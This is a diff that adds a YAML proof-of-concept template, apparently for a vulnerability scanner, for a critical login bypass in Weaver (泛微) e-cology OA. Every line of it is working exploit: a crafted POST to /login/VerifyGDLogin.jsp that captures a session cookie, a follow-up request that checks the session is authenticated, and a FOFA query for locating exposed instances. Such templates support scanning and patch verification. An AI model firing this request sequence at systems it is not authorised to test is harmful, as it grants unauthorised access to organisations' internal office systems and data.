@@ -1,0 +1,25 @@
+id: poc-yaml-e-cology-verifygdlogin-login-bypass
+info:
+  name: 泛微OA e-cology协同办公系统 VerifyGDLogin 登录绕过漏洞
+  severity: critical
+  tags:
+  - 配置不当
+  finger: e-cology
+  fofa: app="泛微-OA（e-cology）"
+requests:
+- method: POST
+  path: /login/VerifyGDLogin.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: urlfrom=123&para=1&para1=TEST&para2=D2427D468ADF8290393FC98A1B9CEDEA
+  expression: status_code == 302
+  output:
+  - regex_match(headers,"ecology_JSessionid=(?P<cookie>.*);")
+- method: POST
+  path: /api/integration/simplesso/hasSession
+  headers:
+    Cookie: ecology_JSessionid={{.cookie}}
+  expression: status_code == 200 && contains(body,"\"loginid\"") && contains(body,"\"hasSession\":true")
+    && !contains(body,"<")
+variables: {}
+transport: http
